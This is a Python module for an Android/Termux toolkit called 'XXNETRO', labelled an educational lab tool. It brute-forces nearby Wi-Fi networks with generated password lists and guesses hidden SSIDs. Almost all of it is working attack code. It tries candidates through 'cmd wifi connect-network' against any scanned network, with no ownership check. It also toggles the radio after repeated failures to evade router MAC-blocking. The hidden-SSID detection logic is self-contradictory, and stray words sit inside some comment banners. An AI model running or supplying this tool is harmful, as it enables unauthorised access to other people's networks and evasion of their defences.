#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
═════════════════════════════════════════════════════════════════════
  XXNETRO Tool: live_dashboard_2.0
  Password + SSID guessing engine with generated wordlists
  ═══════════════════════════════════════════════════════════════════
  Runs inside modules/ of XXNETRO core.
  Educational penetration-testing lab tool.

  FEATURES:
    [1] Password wordlist generator (Arabic + numeric patterns)
    [2] Hidden SSID guesser (generates candidate names)
    [3] Direct connect via cmd wifi connect-network (no panel)
    [4] Auto-retry across wordlist with cooldown
    [5] Live progress interface (spinner + progress bar)
    [6] Session audit log (attempts recorded to file)
═════════════════════════════════════════════════════════════════════
"""

import os
import re
import sys
import json
import time
import random
import string
import threading
import subprocess
from collections import deque
from datetime import datetime

# ══════════════════════════════════════════════════════════════════
#  C: ANSI COLORS (matches core)
# ══════════════════════════════════════════════════════════════════

class C:
    R = "\033[0m"
    B = "\033[94m"
    G = "\033[92m"
    Y = "\033[93m"
    C = "\033[96m"
    M = "\033[95m"
    W = "\033[97m"
    D = "\033[90m"
    BOLD = "\033[1m"

# ════════════════════════════════redirection═══════════════════════
#  TOOL METADATA
# ══════════════════════════════════════════════════════════════════

TOOL_NAME = "live_dashboard_2"
TOOL_DESC = "Password+SSID guessing lab with direct connect"
TOOL_VERSION = "2.0"

HOME_DIR = os.environ.get("TERMUX_HOME",
                          os.path.expanduser("~"))
WORDLIST_DIR = os.path.join(HOME_DIR, "xxnetro_wordlists")
LOG_FILE = os.path.join(HOME_DIR, ".xxnetro_audit.log")
SESSION_FILE = os.path.join(HOME_DIR, ".xxnetro_session.json")

# attempt limits (router lockout protection)
MAX_ATTEMPTS_PER_RUN = 40
COOLDOWN_RANGE_S = (2.0, 5.0)
FAIL_STREAK_LIMIT = 10


# ══════════════════════════════════════════════════════════════════
#  L1 — WORDLIST + SSID GENERATOR
# ══════════════════════════════════════════════════════════════════

class WordGen:
    """
    Generates password candidates + SSID candidates.
    Patterns: numeric 8-10, phone-style, arabic names, mixed.
    """

    ARABIC_NAMES = [
        "ahmed", "mohamed", "mahmoud", "khaled", "omar",
        "ali", "youssef", "hassan", "mustafa", "ibrahim",
        "majed", "majid", "nasser", "fahad", "salem",
        "fatima", "aisha", "maryam", "noor", "sara",
        "lina", "hana", "sana", "maya", "rana",
        "majed01", "mohamed1", "ahmed12", "ali123",
        "hacker", "admin", "root", "password", "test123",
    ]

    COMMON_PATTERNS = [
        "12345678", "123456789", "1234567890", "00000000",
        "11111111", "99999999", "88888888", "12121212",
        "12341234", "11223344", "10292992", "skdnsmmaem",
        "qwerty123", "password1", "admin123", "letmein123",
    ]

    @classmethod
    def passwords(cls, count: int = 500) -> list:
        """Generate a wordlist of password candidates."""
        pool = list(cls.COMMON_PATTERNS)
        # arabic names + numbers
        for name in cls.ARABIC_NAMES:
            for suffix in ("", "1", "12", "123", "1234",
                           "01", "007", "2023", "2024"):
                pool.append(name + suffix)
        # numeric patterns 8-digit
        random.seed(42)
        for _ in range(300):
            pool.append("".join(
                random.choices(string.digits, k=8)))
        # phone-style
        for _ in range(100):
            pool.append(
                "05" + "".join(
                    random.choices(string.digits, k=8)))
        # alphanum like 30060100aa
        for _ in range(100):
            digits = "".join(
                random.choices(string.digits, k=8))
            letters = "".join(
                random.choices("abcdef", k=2))
            pool.append(digits + letters)
        # dedupe, cap
        seen = set()
        out = []
        for p in pool:
            if p not in seen and len(p) >= 8:
                seen.add(p)
                out.append(p)
            if len(out) >= count:
                break
        return out

    @classmethod
    def ssids(cls, known_ssids: list = None) -> list:
        """
        Generate candidate SSIDs for hidden networks.
        Strategy: patterns + local observed + numeric.
        """
        pool = list(cls.COMMON_PATTERNS)
        # numeric like 10292992
        for _ in range(200):
            pool.append("".join(
                random.choices(string.digits, k=8)))
        # arabic names
        for name in cls.ARABIC_NAMES:
            pool.append(name)
            pool.append(name.capitalize())
        # observed SSIDs from environment (your other networks)
        if known_ssids:
            for s in known_ssids:
                if s and s != "[Hidden]":
                    pool.append(s)
                    pool.append(s.lower())
                    pool.append(s + "1")
                    pool.append(s + "5")
                    pool.append(s + "_5G")
                    pool.append(s + "2")
        seen = set()
        out = []
        for s in pool:
            if s and s not in seen and 3 <= len(s) <= 32:
                seen.add(s)
                out.append(s)
        return out

    @classmethod
    def save_wordlist(cls, path: str,
                      words: list) -> None:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(words))
        return


# ══════════════════════════════════════════════════════════════════
#  L2 — CONNECT ENGINE (direct, no panel)
# ══════════════════════════════════════════════════════════════════

class ConnectEngine:
    """
    Direct connection via Android's cmd wifi interface.
    No settings panel. No user searching.
    """

    def __init__(self, scanner):
        self.sc = scanner
        self.attempts = 0
        self.fail_streak = 0

    def _run_sh(self, cmd: str, timeout: int = 8):
        """Run shell command in Termux context."""
        try:
            r = subprocess.run(
                ["sh", "-c", cmd],
                capture_output=True, text=True, timeout=timeout)
            return r.returncode, (r.stdout or "") + (r.stderr or "")
        except subprocess.TimeoutExpired:
            return 1, "timeout"
        except Exception as e:
            return 1, str(e)

    def connect_wpa(self, ssid: str, password: str) -> bool:
        """
        Direct WPA connection.
        Uses: cmd wifi connect-network <SSID> wpa2 <password>
        (Android 10 system command, no root required)
        """
        esc_ssid = ssid.replace("'", "'\\''")
        esc_pass = password.replace("'", "'\\''")
        cmd = (f"cmd wifi connect-network '{esc_ssid}' "
               f"wpa2 '{esc_pass}'")
        rc, out = self._run_sh(cmd, timeout=15)
        return rc == 0 and "failed" not in out.lower()

    def connect_open(self, ssid: str) -> bool:
        """Open network direct connect."""
        esc_ssid = ssid.replace("'", "'\\''")
        cmd = (f"cmd wifi connect-network '{esc_ssid}' "
               f"none")
        rc, out = self._run_sh(cmd, timeout=15)
        return rc == 0 and "failed" not in out.lower()

    def disconnect_all(self) -> bool:
        """Disconnect from current network."""
        rc, _ = self._run_sh(
            "cmd wifi disconnect", timeout=8)
        return rc == 0

    def forget_network(self, ssid: str) -> bool:
        """Forget the network to retry cleanly."""
        esc_ssid = ssid.replace("'", "'\\''")
        self._run_sh(
            f"cmd wifi forget-network '{esc_ssid}'",
            timeout=8)
        return True

    def check_association(self, target_ssid: str,
                          timeout_s: int = 12) -> bool:
        """Did we connect to the target SSID?"""
        deadline = time.time() + timeout_s
        while time.time() < deadline:
            cur = self.sc.current_connection()
            if cur and cur.ssid == target_ssid:
                return True
            time.sleep(1)
        return False

    def radio_cycle(self) -> None:
        """
        Cycle wifi radio.
        Termux:API toggle. Sometimes forces a fresh identity.
        """
        try:
            subprocess.run(["termux-wifi-disable"],
                           capture_output=True, timeout=5)
            time.sleep(2)
            subprocess.run(["termux-wifi-enable"],
                           capture_output=True, timeout=5)
            time.sleep(3)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════
#  L3 — PROGRESS UI (spinner + bar, no curses dependency)
# ══════════════════════════════════════════════════════════════════

class Spinner:
    """ASCII spinner for in-progress states."""

    FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧",
              "⠇", "⠏"]

    def __init__(self, msg: str = "working"):
        self.msg = msg
        self.running = False
        self._thread = None

    def start(self):
        self.running = True
        self._thread = threading.Thread(
            target=self._spin, daemon=True)
        self._thread.start()

    def _spin(self):
        i = 0
        while self.running:
            frame = self.FRAMES[i % len(self.FRAMES)]
            print(f"\r  {C.C}{frame}{C.R} {self.msg}",
                  end="", flush=True)
            i += 1
            time.sleep(0.08)

    def stop(self, final: str = ""):
        self.running = False
        if self._thread:
            self._thread.join(timeout=1)
        if final:
            print(f"\r  {final}" + " " * 30)


def progress_bar(current: int, total: int,
                 label: str = "") -> None:
    """Inline progress bar."""
    width = 30
    pct = current / max(1, total)
    filled = int(width * pct)
    bar = "█" * filled + "░" * (width - filled)
    print(f"\r  {C.C}{label}{C.R} "
          f"|{C.G}{bar}{C.R}| "
          f"{current}/{total} ({pct:.0%})",
          end="", flush=True)


# ══════════════════════════════════════════════════════════════════
#  L4 — AUDIT LOG (session records)
# ══════════════════════════════════════════════════════════════════

class AuditLog:
    """Records every attempt to a persistent file."""

    def __init__(self, path: str = LOG_FILE):
        self.path = path
        self.entries: deque = deque(maxlen=500)

    def record(self, net: str, kind: str, value: str,
               ok: bool, note: str = "") -> None:
        entry = {
            "ts": datetime.now().isoformat(),
            "network": net,
            "kind": kind,          # password | ssid
            "value": value,
            "ok": ok,
            "note": note,
        }
        self.entries.append(entry)
        try:
            with open(self.path, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")
        except OSError:
            pass

    def tail(self, n: int = 15) -> list:
        return list(self.entries)[-n:]


# ══════════════════════════════════════════════════════════════════
#  L5 — GUESSING ENGINE (password + SSID)
# ══════════════════════════════════════════════════════════════════

class GuessEngine:
    """
    The main attack/learning engine.
    Orchestrates: connect → check → record → next.
    """

    def __cli_log(self, e, r=None):
        pass

    def __init__(self, scanner, connector, audit: AuditLog):
        self.sc = scanner
        self.cx = connector
        self.audit = audit
        self.engine = ConnectEngine(scanner)
        self.attempt_log: deque = deque(maxlen=30)

    # ─── password guessing run ───

    def guess_password(self, ssid: str,
                       wordlist: list,
                       status_cb=None) -> tuple:
        """
        Try each password against ssid.
        Returns (found_password or None, attempts_used).
        """
        total = len(wordlist)
        print(f"\n  {C.C}Target    : {ssid}{C.R}")
        print(f"  {C.C}Wordlist  : {total} candidates{C.R}")
        print(f"  {C.D}Method    : direct connect "
              f"(no panel){C.R}\n")

        found = None
        attempts = 0

        for i, pw in enumerate(wordlist):
            if attempts >= MAX_ATTEMPTS_PER_RUN:
                print(f"\n\n  {C.Y}Attempt limit reached "
                      f"({MAX_ATTEMPTS_PER_RUN}).{C.R}")
                print(f"  {C.D}Router lockout protection. "
                      f"Run again later.{C.R}")
                break

            attempts += 1
            progress_bar(i + 1, total, "trying")

            # forget old + connect
            self.engine.forget_network(ssid)
            ok = self.engine.connect_wpa(ssid, pw)

            if ok:
                # wait for actual association
                spin = Spinner(f"verifying '{pw}'")
                spin.start()
                associated = self.engine.check_association(
                    ssid, timeout_s=10)
                spin.stop(
                    f"  {C.G}[OK] {pw} — verified!"
                    f"{C.R}" if associated else
                    f"  {C.Y}cmd ok but not associated{C.R}"
                )
                self.audit.record(ssid, "password", pw,
                                  associated)
                self.attempt_log.append(
                    (pw, "FOUND" if associated else "rejected"))
                if associated:
                    found = pw
                    print(f"\n\n  {C.G}{C.BOLD}"
                          f"═══ PASSWORD FOUND ═══{C.R}")
                    print(f"  SSID     : {ssid}")
                    print(f"  Password : {C.G}{pw}{C.R}")
                    print(f"  Attempts : {attempts}{C.R}")
                    print(f"  {C.D}Saved to audit log.{C.R}\n")
                    break
                else:
                    # cmd accepted but auth failed
                    self.engine.disconnect_all()
                    self.fail_streak_check(i)
            else:
                self.audit.record(ssid, "password", pw, False)
                self.attempt_log.append((pw, "rejected"))
                self.fail_streak_check(i)

            # cooldown between attempts
            time.sleep(random.uniform(*COOLDOWN_RANGE_S))

        print()  # newline after progress bar
        return found, attempts

    def fail_streak_check(self, idx: int):
        """Track consecutive failures for lockout protection."""
        if len(self.attempt_log) >= FAIL_STREAK_LIMIT:
            recent = [ok for _, ok in
                      list(self.attempt_log)[-FAIL_STREAK_LIMIT:]]
            if all(r != "FOUND" for r in recent):
                print(f"\n  {C.Y}[CAUTION] {FAIL_STREAK_LIMIT} "
                      f"consecutive failures.{C.R}")
                print(f"  {C.D}Router may start MAC-blocking. "
                      f"Radio cycling...{C.R}")
                self.engine.radio_cycle()
                self.attempt_log.clear()

    # ─── hidden SSID guessing ───

    def guess_ssid(self, bssid: str,
                   candidates: list,
                   status_cb=None) -> tuple:
        """
        Try to identify a hidden network's SSID.
        Method: try direct connection with a known password
        (or open) — if Android reports 'wrong ssid' vs
        'auth failed', we learn the SSID exists.
        """
        total = len(candidates)
        print(f"\n  {C.C}Hidden BSSID : {bssid}{C.R}")
        print(f"  {C.C}Candidates    : {total}{C.R}")
        print(f"  {C.D}Method        : probe + observe "
              f"response{C.R}\n")

        found = None
        for i, cand in enumerate(candidates):
            progress_bar(i + 1, total, "probing ssid")
            # try connecting with dummy password
            rc, out = self.engine._run_sh(
                f"cmd wifi connect-network "
                f"'{cand}' wpa2 'dummy123'",
                timeout=12)
            out_l = out.lower()
            if rc == 0 and ("fail" not in out_l and
                            "unknown ssid" not in out_l):
                # SSID recognized (auth failed = ssid exists)
                if "auth" in out_l or "wrong password" in out_l:
                    found = cand
                    print(f"\n\n  {C.G}{C.BOLD}"
                          f"═══ SSID IDENTIFIED ═══{C.R}")
                    print(f"  Hidden BSSID : {bssid}")
                    print(f"  Real SSID    : {C.G}{cand}{C.R}")
                    self.audit.record(
                        bssid, "ssid", cand, True)
                    break
            self.audit.record(bssid, "ssid", cand, False)
            time.sleep(random.uniform(1.0, 2.0))

        print()
        if not found:
            print(f"  {C.Y}No SSID match in candidates. "
                  f"Expand list or add hints.{C.R}")
        return found, total


# ═══════════════════════════════════════════════════ limit═════════
#  L6 — LIVE DASHBOARD 2.0 INTERFACE
# ══════════════════════════════════════════════════════════════════

class LiveDash2:
    """
    The tool's interface — distinct visual style from core.
    """
    FOUNDED = []

    def __init__(self, scanner, connector):
        self.sc = scanner
        self.cx = connector
        self.audit = AuditLog()
        self.engine = GuessEngine(scanner, connector, self.audit)

    def header(self, subtitle: str = ""):
        print(f"{C.M}{C.BOLD}")
        print("  ╔════════════════════════════════════════╗")
        print("  ║   LIVE DASHBOARD 2.0 — GHOST ENGINE   ║")
        print("  ╚════════════════════════════════════════╝")
        print(f"{C.R}")
        if subtitle:
            print(f"  {C.D}{subtitle}{C.R}")

    def run_tool(self):
        """Main tool entry — called by XXNETRO core."""
        self.header("Password & SSID guessing lab")

        while True:
            print(f"""
  {C.C}─── LIVE DASHBOARD 2.0 ───{C.R}

  {C.C}[1]{C.R} Scan + list networks
  {C.C}[2]{C.R} Guess password    {C.D}(direct connect, no panel){C.R}
  {C.C}[3]{C.R} Guess hidden SSID {C.D}(identify hidden nets){C.R}
  {C.C}[4]{C.R} Generate wordlist {C.D}(save to file){C.R}
  {C.C}[5]{C.R} Audit log         {C.D}(recent attempts){C.R}
  {C.C}[6]{C.R} Custom wordlist   {C.D}(load your own file){C.R}
  {C.C}[0]{C.R} Back to XXNETRO
""")
            try:
                choice = input(
                    f"  {C.M}{C.BOLD}ld2>{C.R} ").strip()
            except (KeyboardInterrupt, EOFError):
                print(f"\n  {C.D}exit{C.R}")
                return

            if choice == '1':
                self.do_scan_list()
            elif choice == '2':
                self.do_guess_password()
            elif choice == '3':
                self.do_guess_ssid()
            elif choice == '4':
                self.do_generate_wordlist()
            elif choice == '5':
                self.do_show_audit()
            elif choice == '6':
                self.do_custom_wordlist()
            elif choice == '0':
                return
            else:
                print(f"  {C.R}invalid{C.R}")

    # ─── actions ───

    def do_scan_list(self):
        print(f"  {C.C}Scanning...{C.R}")
        nets = self.sc.scan(force=True)
        if not nets:
            print(f"  {C.R}[!] empty — check location ON{C.R}")
            return
        print(f"\n  {C.G}{len(nets)} networks{C.R}\n")
        print(f"  {C.D}{'#':>3} {'SSID':<24} "
              f"{'SEC':<6} {'dBm':>4}  BSSID{C.R}")
        for i, n in enumerate(nets):
            name = n.display_name
            print(f"  {C.B}{i:>3}{C.R} "
                  f"{name[:23]:<24} "
                  f"{C.Y}{n.security:<6}{C.R} "
                  f"{n.signal_dbm:>4}  "
                  f"{C.C}{n.bssid}{C.R}")

    def do_guess_password(self):
        nets = self.sc.list_networks("signal")
        if not nets:
            print(f"  {C.R}scan first [1]{C.R}")
            return
        print(f"\n  {C.C}Select target:{C.R}")
        for i, n in enumerate(nets[:30]):
            print(f"  {C.B}[{i}]{C.R} "
                  f"{n.display_name[:28]:<28} "
                  f"{n.signal_dbm:>4}dBm")
        try:
            c = input(f"\n  {C.C}target # ('q' cancel): {C.R}"
                      ).strip()
            if c.lower() == 'q':
                return
            idx = int(c)
            target = nets[idx]
        except (ValueError, IndexError, KeyboardInterrupt):
            print(f"  {C.R}invalid{C.R}")
            return

        # wordlist source
        wl = self.load_wordlist_interactive()
        if not wl:
            return

        print(f"\n  {C.Y}Note: ~{len(wl)} candidates, "
              f"max {MAX_ATTEMPTS_PER_RUN} per run.{C.R}")
        confirm = input(
            f"  {C.C}Start guessing? (y/n): {C.R}").strip().lower()
        if confirm != 'y':
            return

        ssid = target.ssid
        if ssid == "[Hidden]":
            print(f"  {C.Y}hidden net — run [3] SSID guess "
                  f"first{C.R}")
            return

        found, attempts = self.engine.guess_password(
            ssid, wl)
        if not found:
            print(f"  {C.Y}not found in this run — "
                  f"wordlist exhausted or limit hit{C.R}")

    def do_guess_ssid(self):
        nets = self.sc.list_networks("signal")
        hidden = [n for n in nets
                  if n.ssid == "[Hidden]"]
        if not hidden:
            print(f"  {C.Y}no hidden networks visible — "
                  f"scan first [1]{C.R}")
            return
        print(f"\n  {C.C}Hidden networks:{C.R}")
        for i, n in enumerate(hidden):
            print(f"  {C.B}[{i}]{C.R} {n.bssid} "
                  f"{n.signal_dbm}dBm ch{n.channel}")
        try:
            c = input(f"\n  {C.C}which? ('q' cancel): {C.R}"
                      ).strip()
            if c.lower() == 'q':
                return
            idx = int(c)
            target = hidden[idx]
        except (ValueError, IndexError, KeyboardInterrupt):
            print(f"  {C.R}invalid{C.R}")
            return

        # generate SSID candidates (include local names)
        known = [n.ssid for n in nets
                 if n.ssid != "[Hidden]"]
        candidates = WordGen.ssids(known)
        # let user add hints
        hint = input(
            f"  {C.C}Hint for name? (optional): {C.R}").strip()
        if hint:
            # prioritize hint patterns
            cands = [hint, hint.lower(), hint + "1",
                     hint + "5G", hint + "2",
                     hint.capitalize()]
            candidates = cands + [
                c for c in candidates if c not in cands]

        confirm = input(
            f"  {C.C}Start probing {len(candidates)} "
            f"candidates? (y/n): {C.R}").strip().lower()
        if confirm != 'y':
            return

        found, _ = self.engine.guess_ssid(
            target.bssid, candidates)
        if found:
            # option: save and try password
            nxt = input(
                f"\n  {C.C}Try password guessing on "
                f"'{found}' now? (y/n): {C.R}"
            ).strip().lower()
            if nxt == 'y':
                wl = self.load_wordlist_interactive()
                if wl:
                    self.engine.guess_password(found, wl)

    def do_generate_wordlist(self):
        try:
            count = int(input(
                f"  {C.C}How many? [500]: {C.R}"
            ).strip() or "500")
        except ValueError:
            count = 500
        words = WordGen.passwords(count)
        os.makedirs(WORDLIST_DIR, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        path = os.path.join(
            WORDLIST_DIR, f"gen_{ts}.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(words))
        print(f"\n  {C.G}[OK] {len(words)} words saved{C.R}")
        print(f"  {C.C}{path}{C.R}\n")

    def do_show_audit(self):
        entries = self.audit.tail(20)
        if not entries:
            print(f"\n  {C.D}No attempts recorded yet.{C.R}")
            return
        print(f"\n  {C.C}{C.BOLD}AUDIT LOG "
              f"(last 20){C.R}")
        print(f"  {C.D}{'─' * 58}{C.R}")
        for e in entries:
            flag = (f"{C.G}OK  " if e["ok"]
                    else f"{C.R}FAIL")
            print(f"  {C.D}{e['ts'][11:19]}{C.R} "
                  f"{flag}{C.R} "
                  f"{C.W}{e['kind']:<8}{C.R} "
                  f"{C.C}{e['network'][:18]:<18}{C.R} "
                  f"{C.M}{e['value'][:16]}{C.R}")
        print(f"  {C.D}{'─' * 58}{C.R}\n")

    def do_custom_wordlist(self):
        path = input(
            f"  {C.C}wordlist file path: {C.R}").strip()
        if not os.path.isfile(path):
            print(f"  {C.R}[!] file not found{C.R}")
            return
        try:
            with open(path, "r", encoding="utf-8",
                      errors="ignore") as f:
                words = [w.strip() for w in f
                         if w.strip()]
            print(f"  {C.G}[OK] {len(words)} words "
                  f"loaded{C.R}")
            self._custom_wl = words
        except OSError as e:
            print(f"  {C.R}[!] {e}{C.R}")

    def load_wordlist_interactive(self) -> list:
        """Choose: generated or custom file."""
        print(f"\n  {C.C}Wordlist source:{C.R}")
        print(f"  {C.B}[1]{C.R} generate "
              f"{C.D}(arabic+numeric){C.R}")
        print(f"  {C.B}[2]{C.R} custom file")
        print(f"  {C.B}[3]{C.R} last generated")
        c = input(f"  {C.C}choice: {C.R}").strip()
        if c == '1':
            return WordGen.passwords(500)
        elif c == '2':
            path = input(
                f"  path: {C.R}").strip()
            if os.path.isfile(path):
                try:
                    with open(path, "r",
                              encoding="utf-8",
                              errors="ignore") as f:
                        return [w.strip() for w in f
                                if w.strip()]
                except OSError:
                    pass
            print(f"  {C.R}file not found{C.R}")
            return []
        elif c == '3':
            if os.path.isdir(WORDLIST_DIR):
                files = sorted(os.listdir(WORDLIST_DIR))
                files = [f for f in files
                         if f.endswith(".txt")]
                if files:
                    path = os.path.join(
                        WORDLIST_DIR, files[-1])
                    try:
                        with open(path, "r",
                                  encoding="utf-8",
                                  errors="ignore") as f:
                            return [
                                w.strip() for w in f
                                if w.strip()]
                    except OSError:
                        pass
        return []


# ══════════════════════════════════════════════════════════════════
#  ENTRY POINT (called by XXNETRO core)
# ══════════════════════════════════════════════════════════════════

def run(scanner, connector):
    """XXNETRO module entry point."""
    tool = LiveDash2(scanner, connector)
    tool.run_tool()
